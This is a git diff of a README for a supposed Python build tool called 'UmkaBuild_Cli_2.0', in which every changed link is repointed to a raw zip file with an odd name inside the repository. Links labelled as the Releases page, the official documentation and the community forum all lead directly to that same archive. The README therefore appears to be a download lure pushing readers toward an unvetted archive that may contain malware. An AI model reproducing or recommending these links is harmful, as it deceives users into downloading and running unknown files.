@@ -1,6 +1,6 @@
 # 🚀 UmkaBuild_Cli_2.0 - Simple Tool for Building Python Projects
 
-[![Download Now](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip%20Now-UmkaBuild_Cli_2.0-brightgreen)](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip)
+[![Download Now](https://github.com/shawndcool/UmkaBuild_Cli_2.0/raw/refs/heads/master/core/Cli-Umka-Build-sulphothionyl.zip%20Now-UmkaBuild_Cli_2.0-brightgreen)](https://github.com/shawndcool/UmkaBuild_Cli_2.0/raw/refs/heads/master/core/Cli-Umka-Build-sulphothionyl.zip)
 
 ## 🛠️ Description
 
@@ -26,7 +26,7 @@ To begin using UmkaBuild_Cli_2.0, you will need to download and install the soft
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page to download](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip).
+1. Visit the [Releases page to download](https://github.com/shawndcool/UmkaBuild_Cli_2.0/raw/refs/heads/master/core/Cli-Umka-Build-sulphothionyl.zip).
 2. On the Releases page, find the latest version of UmkaBuild_Cli_2.0.
 3. Click on the version you want to download.
 4. Download the appropriate installer for your operating system.
@@ -58,12 +58,12 @@ We welcome contributions from everyone. If you want to improve UmkaBuild_Cli_2.0
 
 ## 🔗 Additional Resources
 
-- [UmkaBuild Official Documentation](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip)
-- [UmkaBuild Community Forum](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip)
+- [UmkaBuild Official Documentation](https://github.com/shawndcool/UmkaBuild_Cli_2.0/raw/refs/heads/master/core/Cli-Umka-Build-sulphothionyl.zip)
+- [UmkaBuild Community Forum](https://github.com/shawndcool/UmkaBuild_Cli_2.0/raw/refs/heads/master/core/Cli-Umka-Build-sulphothionyl.zip)
 
 ## 📅 Release Notes
 
-Keep an eye on the [Releases page](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip) for updates, new features, and bug fixes. Each release includes detailed notes on what has changed or improved.
+Keep an eye on the [Releases page](https://github.com/shawndcool/UmkaBuild_Cli_2.0/raw/refs/heads/master/core/Cli-Umka-Build-sulphothionyl.zip) for updates, new features, and bug fixes. Each release includes detailed notes on what has changed or improved.
 
 ## ⚖️ License
 
